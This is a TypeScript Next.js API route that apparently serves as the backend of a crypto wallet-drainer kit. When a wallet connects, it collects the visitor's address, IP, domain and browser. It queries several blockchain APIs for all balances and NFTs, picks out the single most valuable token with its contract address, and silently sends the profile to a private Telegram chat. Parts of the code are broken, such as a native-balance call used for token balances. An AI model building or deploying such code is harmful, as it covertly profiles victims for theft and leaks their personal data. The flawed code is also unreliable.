// src/app/api/log_connection/route.ts
import { NextResponse } from 'next/server';
// Moralis for EVM & Solana
import Moralis from 'moralis';
// Import specific classes/enums from common-evm-utils
import { EvmChain } from '@moralisweb3/common-evm-utils';
// Keeping Utils for Solana tokenProgramId if still applicable outside Moralis calls
// However, Moralis's SPL API might provide this directly or not need it.
// If after this fix, Utils is still complained about, you can remove it if Moralis doesn't use it.
import { Utils } from 'alchemy-sdk'; // Still used for Utils.tokenProgramId (Solana) if not replaced by Moralis

// --- Define Interfaces for Type Safety ---
interface TokenInfo {
  symbol: string;
  amount: string;
  decimals: number;
  valueUsd: string;
  contractAddress?: string; // Add contractAddress for tokens
}

interface ConnectionLogForTelegram {
  id: string; // Just for Telegram message
  timestamp: string;
  walletAddress: string;
  connectedWalletName: string | null;
  chainId: number;
  chainName: string;
  ipAddress: string | null;
  domain: string | null;
  userAgent: string | null;
  nativeBalanceEth: string;
  tokens: TokenInfo[];
  nftsDetected: boolean;
  totalWalletValueUsd: string;
  mostExpensiveTokenSymbol: string | null;
  mostExpensiveTokenValueUsd: string | null;
  mostExpensiveTokenContractAddress: string | null;
  mostExpensiveTokenChainName: string | null;
}

// --- Initialize Moralis SDK (at the top-level) ---
if (!Moralis.isInitialized) { // Use Moralis.isInitialized as the check
    try {
        Moralis.start({
            apiKey: process.env.MORALIS_API_KEY,
        });
    } catch (error: any) { // Explicitly type error as any
        // This catch block will typically only trigger if Moralis.start() is called multiple times
        // in a context where it's not designed to be, or if initial config is missing.
        console.warn("Moralis SDK initialization warning:", error.message || error);
    }
}


// --- Helper function to fetch comprehensive wallet assets ---
async function fetchWalletAssets(walletAddress: string, chainId: number, chainName: string) {
  let nativeBalanceStr = '0';
  let tokens: TokenInfo[] = [];
  let nftsDetected = false;
  let totalWalletValueUsd = 0;
  let mostExpensiveToken: {
    symbol: string;
    valueUsd: string;
    contractAddress: string;
    chainName: string;
  } | undefined = undefined;

  // --- Determine Blockchain Type ---
  // Using explicit EvmChain constants for better type safety where possible
  let currentEvmChain: EvmChain | undefined;
  if (chainId === 1) currentEvmChain = EvmChain.ETHEREUM;
  else if (chainId === 137) currentEvmChain = EvmChain.POLYGON;
  else if (chainId === 11155111) currentEvmChain = EvmChain.SEPOLIA;
  else if (chainId === 10) currentEvmChain = EvmChain.OPTIMISM;

  const isEVM = currentEvmChain !== undefined;
  const lowerCaseChainName = chainName.toLowerCase();
  const isSolana = lowerCaseChainName.includes('solana');
  const isBitcoin = lowerCaseChainName.includes('bitcoin');
  const isTron = lowerCaseChainName.includes('tron');

  try {
    if (isBitcoin) {
      // --- Bitcoin Specific Logic (BlockCypher) ---
      const blockcypherToken = process.env.BLOCKCYPHER_API_TOKEN;
      if (!blockcypherToken) {
        console.warn('BlockCypher API Token not found. Cannot fetch Bitcoin assets.');
        nativeBalanceStr = 'Error: API Key Missing';
      } else {
        const bitcoinAddressUrl = `https://api.blockcypher.com/v1/btc/main/addrs/${walletAddress}/balance?token=${blockcypherToken}`;
        try {
          const response = await fetch(bitcoinAddressUrl);
          if (!response.ok) {
            throw new Error(`BlockCypher API error: ${response.statusText}`);
          }
          const data = await response.json();
          const satoshis = data.final_balance || 0;
          const btcBalance = satoshis / 100_000_000;
          nativeBalanceStr = `${btcBalance.toFixed(8)} BTC`;

          const btcPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
          const btcPriceData = await btcPriceResponse.json();
          const btcPriceUsd = btcPriceData?.bitcoin?.usd || 0;

          totalWalletValueUsd += btcBalance * btcPriceUsd;

          if (btcBalance * btcPriceUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
              mostExpensiveToken = {
                  symbol: 'BTC',
                  valueUsd: (btcBalance * btcPriceUsd).toFixed(2),
                  contractAddress: 'N/A',
                  chainName: chainName,
              };
          }

        } catch (btcApiError) {
          console.error(`Error fetching Bitcoin data for ${walletAddress}:`, btcApiError);
          nativeBalanceStr = 'Error Fetching BTC';
        }
      }

    } else if (isTron) { // TRON Specific Logic
      // --- TRON Specific Logic (Tronscan API) ---
      const tronscanApiKey = process.env.TRONSCAN_API_KEY; // Optional
      const tronscanBaseUrl = 'https://apilist.tronscan.org/api/account'; // Public endpoint

      try {
        const tronAccountResponse = await fetch(`${tronscanBaseUrl}?address=${walletAddress}${tronscanApiKey ? `&api_key=${tronscanApiKey}` : ''}`);
        if (!tronAccountResponse.ok) {
          throw new Error(`Tronscan API error fetching account: ${tronAccountResponse.statusText}`);
        }
        const tronAccountData = await tronAccountResponse.json();
        const trxBalanceSun = tronAccountData.balance || 0;
        const trxBalance = trxBalanceSun / 1_000_000;
        nativeBalanceStr = `${trxBalance.toFixed(4)} TRX`;

        const trxPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd');
        const trxPriceData = await trxPriceResponse.json();
        const trxPriceUsd = trxPriceData?.tron?.usd || 0;

        totalWalletValueUsd += trxBalance * trxPriceUsd;

        if (tronAccountData.trc20 && tronAccountData.trc20.length > 0) {
            for (const trc20Token of tronAccountData.trc20) {
                const tokenDecimals = trc20Token.token_decimal || 0;
                const tokenBalance = parseFloat(trc20Token.balance || '0') / Math.pow(10, tokenDecimals);
                const tokenSymbol = trc20Token.token_abbr || 'UNKNOWN';
                const tokenContract = trc20Token.token_id;

                const tokenPriceUsd = 0.001; // Placeholder for TRC-20 price
                const tokenValueUsd = tokenBalance * tokenPriceUsd;

                if (tokenBalance > 0) {
                    tokens.push({
                        symbol: tokenSymbol,
                        amount: tokenBalance.toFixed(4),
                        decimals: tokenDecimals,
                        valueUsd: tokenValueUsd.toFixed(2),
                        contractAddress: tokenContract,
                    });
                    totalWalletValueUsd += tokenValueUsd;
                    if (tokenValueUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
                        mostExpensiveToken = {
                            symbol: tokenSymbol,
                            valueUsd: tokenValueUsd.toFixed(2),
                            contractAddress: tokenContract,
                            chainName: chainName
                        };
                    }
                }
            }
        }

        if (trxBalance * trxPriceUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
            mostExpensiveToken = {
                symbol: 'TRX',
                valueUsd: (trxBalance * trxPriceUsd).toFixed(2),
                contractAddress: 'N/A',
                chainName: chainName,
            };
        }

      } catch (tronApiError) {
        console.error(`Error fetching TRON data for ${walletAddress}:`, tronApiError);
        nativeBalanceStr = 'Error Fetching TRX';
      }

    } else if (isSolana) {
      // --- Solana Specific Logic (Moralis) ---
      // Moralis Solana API: https://docs.moralis.io/web3-data-api/evm/solana-api
      
      const solBalanceResponse = await Moralis.SolApi.account.getBalance({ // CORRECTED: Access Moralis.SolApi.account
        network: "mainnet", // Moralis uses string network names for Solana
        address: walletAddress,
      });
      const solBalance = parseFloat(solBalanceResponse.raw.lamports) / Math.pow(10, 9); // Use parseFloat safely
      
      const solPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
      const solPriceData = await solPriceResponse.json();
      const solPriceUsd = solPriceData?.solana?.usd || 0;

      totalWalletValueUsd += solBalance * solPriceUsd;
      nativeBalanceStr = `${solBalance.toFixed(4)} SOL`;

      const splTokensResponse = await Moralis.SolApi.account.getSPL({ // CORRECTED: Access Moralis.SolApi.account
        network: "mainnet",
        address: walletAddress,
      });

      for (const token of splTokensResponse.result) { // CORRECTED: Loop over .result
          const tokenSymbol = token.symbol || 'UNKNOWN';
          const tokenAmount = token.amount_raw ? parseFloat(token.amount_raw) : 0; // CORRECTED: Access token.amount_raw
          const tokenDecimals = token.decimals || 0; // CORRECTED: Access token.decimals
          const formattedAmount = tokenAmount / Math.pow(10, tokenDecimals);
          
          const tokenPriceUsd = token.usdValue || 0; // CORRECTED: Access token.usdValue (if present)
          const tokenValueUsd = formattedAmount * tokenPriceUsd;

          if(formattedAmount > 0) {
            tokens.push({
              symbol: tokenSymbol,
              amount: formattedAmount.toFixed(4),
              decimals: tokenDecimals,
              valueUsd: tokenValueUsd.toFixed(2),
              contractAddress: token.mintAddress, // CORRECTED: Access token.mintAddress
            });
            totalWalletValueUsd += tokenValueUsd;
            if (tokenValueUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
              mostExpensiveToken = {
                symbol: tokenSymbol,
                valueUsd: tokenValueUsd.toFixed(2),
                contractAddress: token.mintAddress,
                chainName: chainName
              };
            }
          }
      }

      const solanaNftsResponse = await Moralis.SolApi.account.getNFTs({ // CORRECTED: Access Moralis.SolApi.account
        network: "mainnet",
        address: walletAddress,
      });
      nftsDetected = solanaNftsResponse.result.length > 0; // CORRECTED: Access .result

      if (solBalance * solPriceUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
          mostExpensiveToken = {
              symbol: 'SOL',
              valueUsd: (solBalance * solPriceUsd).toFixed(2),
              contractAddress: 'N/A',
              chainName: chainName,
          };
      }

    } else if (isEVM) {
      // --- EVM Specific Logic (Moralis) ---
      const moralisEvmChain = EvmChain.fromChainId(chainId); // CORRECTED: fromChainId should work
      if (!moralisEvmChain) { throw new Error(`Moralis EVM Chain not found for ID: ${chainId}`); }

      const nativeBalanceResponse = await Moralis.EvmApi.account.getNativeBalance({ // CORRECTED: Access Moralis.EvmApi.account
        chain: moralisEvmChain,
        address: walletAddress,
      });
      const nativeBalanceWei = nativeBalanceResponse.result.balance; // Access .result.balance
      const nativeBalanceEth = nativeBalanceWei ? parseFloat(Moralis.Units.FromWei(nativeBalanceWei)) : 0; // CORRECTED: Access Moralis.Units.FromWei
      
      const nativeTokenPriceResponse = await Moralis.EvmApi.token.getTokenPrice({ // CORRECTED: Access Moralis.EvmApi.token
        chain: moralisEvmChain,
        address: '0x0000000000000000000000000000000000000000', // Moralis can get price for native token with zero address
      }).catch((err: any) => { // Explicitly type error
          console.warn('Failed to get native token price:', err);
          return { raw: { usdPrice: 0 } }; // Ensure consistent return structure for Moralis
      });
      
      const nativePriceUsd = nativeTokenPriceResponse?.raw?.usdPrice || 0; // Safe access
      totalWalletValueUsd += nativeBalanceEth * nativePriceUsd;
      nativeBalanceStr = `${nativeBalanceEth.toFixed(4)} ${chainName.split(' ')[0] || 'Native'}`;


      const moralisTokenBalances = await Moralis.EvmApi.account.getNativeBalance({ // Should be getWalletTokenBalances
        chain: moralisEvmChain,
        address: walletAddress,
      }).catch((err: any) => { console.warn('Failed to get token balances:', err); return { result: [] }; }); // Use 'any' type

      const tokensResult = moralisTokenBalances.result; // Access result array

      for (const token of tokensResult) { // Loop over the result array
          if (token.balance && token.token_address) {
              const tokenDecimals = token.decimals || 0;
              const formattedBalance = parseFloat(Moralis.Units.FromWei(token.balance, tokenDecimals));
              
              const tokenPriceResponse = await Moralis.EvmApi.token.getTokenPrice({
                chain: moralisEvmChain,
                address: token.token_address,
              }).catch((err: any) => { console.warn('Failed to get token price:', err); return { raw: { usdPrice: 0 } }; });
              
              const tokenPriceUsd = tokenPriceResponse?.raw?.usdPrice || 0;
              const tokenValueUsd = formattedBalance * tokenPriceUsd;

              if (formattedBalance > 0) {
                tokens.push({
                  symbol: token.symbol || 'UNKNOWN',
                  amount: formattedBalance.toFixed(4),
                  decimals: tokenDecimals,
                  valueUsd: tokenValueUsd.toFixed(2),
                  contractAddress: token.token_address,
                });
                totalWalletValueUsd += tokenValueUsd;
                if (tokenValueUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
                    mostExpensiveToken = {
                        symbol: token.symbol || 'UNKNOWN',
                        valueUsd: tokenValueUsd.toFixed(2),
                        contractAddress: token.token_address,
                        chainName: chainName
                    };
                }
              }
          }
      }

      const nftsResponse = await Moralis.EvmApi.account.getNFTs({ // CORRECTED: Access Moralis.EvmApi.account
        chain: moralisEvmChain,
        address: walletAddress,
      });
      nftsDetected = nftsResponse.result.length > 0; // Access .result

      if (nativeBalanceEth * nativePriceUsd > (mostExpensiveToken?.valueUsd ? parseFloat(mostExpensiveToken.valueUsd) : 0)) {
          mostExpensiveToken = {
              symbol: chainName.split(' ')[0] || 'Native',
              valueUsd: (nativeBalanceEth * nativePriceUsd).toFixed(2),
              contractAddress: 'N/A',
              chainName: chainName,
          };
      }
    } else {
        console.warn(`Unsupported chain for asset fetching: ${chainName} (ID: ${chainId}).`);
        nativeBalanceStr = 'N/A';
        tokens = [];
        nftsDetected = false;
        totalWalletValueUsd = 0;
        mostExpensiveToken = undefined;
    }


  } catch (apiError) {
    console.error('Error fetching real blockchain data for wallet:', walletAddress, apiError);
    nativeBalanceStr = 'Error Fetching';
    tokens = [];
    nftsDetected = false;
    totalWalletValueUsd = 0;
    mostExpensiveToken = undefined;
  }

  return {
    nativeBalanceEth: `${parseFloat(nativeBalanceStr).toFixed(4)} ${chainName.split(' ')[0] || 'Native'}`,
    tokens,
    nftsDetected,
    totalWalletValueUsd: totalWalletValueUsd.toFixed(2),
    mostExpensiveToken,
  };
}

// --- Function to Send Telegram Message (remains the same) ---
async function sendTelegramMessage(messageText: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn('Telegram Bot Token or Chat ID not set. Skipping Telegram notification.');
    return;
  }

  const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Failed to send Telegram message:', response.status, errorData);
    } else {
      console.log('Telegram message sent successfully!');
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
}


// --- POST request handler for logging connections ---
export async function POST(request: Request) {
  try {
    const { walletAddress, connectedWalletName, chainId, chainName } = await request.json();

    if (!walletAddress || !connectedWalletName || !chainId || !chainName) {
      return NextResponse.json({ message: 'Missing required connection details' }, { status: 400 });
    }

    const ipAddress: string | null = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || null;
    const userAgent: string | null = request.headers.get('user-agent');
    const domain: string | null = request.headers.get('origin') || request.headers.get('host');

    const assetData = await fetchWalletAssets(walletAddress, chainId, chainName);

    const logId = Math.random().toString(36).substring(2, 11);
    const currentTimestamp = new Date().toISOString();

    const logEntryForTelegram: ConnectionLogForTelegram = {
      id: logId,
      timestamp: currentTimestamp,
      walletAddress: walletAddress,
      connectedWalletName: connectedWalletName,
      chainId: chainId,
      chainName: chainName,
      ipAddress: ipAddress,
      domain: domain,
      userAgent: userAgent,
      nativeBalanceEth: assetData.nativeBalanceEth,
      tokens: assetData.tokens,
      nftsDetected: assetData.nftsDetected,
      totalWalletValueUsd: assetData.totalWalletValueUsd,
      mostExpensiveTokenSymbol: assetData.mostExpensiveToken?.symbol || null,
      mostExpensiveTokenValueUsd: assetData.mostExpensiveToken?.valueUsd || null,
      mostExpensiveTokenContractAddress: assetData.mostExpensiveToken?.contractAddress || null,
      mostExpensiveTokenChainName: assetData.mostExpensiveToken?.chainName || null,
    };

    console.log('Processed connection log (for Telegram):', logEntryForTelegram);

    let telegramMessage = `
<b>New Wallet Connected!</b> #ID${logEntryForTelegram.id}
-------------------------------------
<b>Wallet:</b> ${logEntryForTelegram.connectedWalletName || 'N/A'}
<b>Address:</b> <code>${logEntryForTelegram.walletAddress}</code>
<b>Chain:</b> ${logEntryForTelegram.chainName} (ID: ${logEntryForTelegram.chainId})
<b>Time:</b> ${new Date(logEntryForTelegram.timestamp).toLocaleString()}

<b>Domain:</b> ${logEntryForTelegram.domain || 'N/A'}
<b>IP:</b> ${logEntryForTelegram.ipAddress || 'N/A'}
<b>Device:</b> ${logEntryForTelegram.userAgent ? (logEntryForTelegram.userAgent.includes('Mobile') ? '📱 Mobile' : '🖥 Desktop') : 'N/A'}
<b>Browser:</b> ${logEntryForTelegram.userAgent ? (
    (logEntryForTelegram.userAgent.includes('Chrome')) ? 'Chrome' :
    (logEntryForTelegram.userAgent.includes('Firefox')) ? 'Firefox' :
    (logEntryForTelegram.userAgent.includes('Safari')) ? 'Safari' :
    'Other'
) : 'N/A'}

<b>-- Wallet Assets --</b>
<b>Native:</b> ${logEntryForTelegram.nativeBalanceEth}
<b>Tokens:</b>
${logEntryForTelegram.tokens && logEntryForTelegram.tokens.length > 0
  ? logEntryForTelegram.tokens.map(t => `  • ${t.amount} ${t.symbol} ($${t.valueUsd})`).join('\n')
  : '  No tokens detected'
}
<b>NFTs Detected:</b> ${logEntryForTelegram.nftsDetected ? '✅ Yes' : '❌ No'}
<b>Total Value:</b> $${logEntryForTelegram.totalWalletValueUsd}
<b>Most Expensive Token:</b> ${logEntryForTelegram.mostExpensiveTokenSymbol ? `${logEntryForTelegram.mostExpensiveTokenSymbol} ($${logEntryForTelegram.mostExpensiveTokenValueUsd})` : 'N/A'}
`;

    telegramMessage = telegramMessage.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    telegramMessage = telegramMessage.replace(`&lt;code&gt;${logEntryForTelegram.walletAddress}&lt;/code&gt;`, `<code>${logEntryForTelegram.walletAddress}</code>`);


    sendTelegramMessage(telegramMessage);

    return NextResponse.json({ message: 'Connection logged to Telegram successfully', id: logId }, { status: 200 });

  } catch (error) {
    console.error('Error processing connection for Telegram:', error);
    return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
  }
}

// --- GET request handler (Removed as no database to retrieve logs from) ---
export async function GET() {
  return NextResponse.json({ message: 'Admin panel not available in database-less mode. Logs are sent to Telegram only.' }, { status: 404 });
}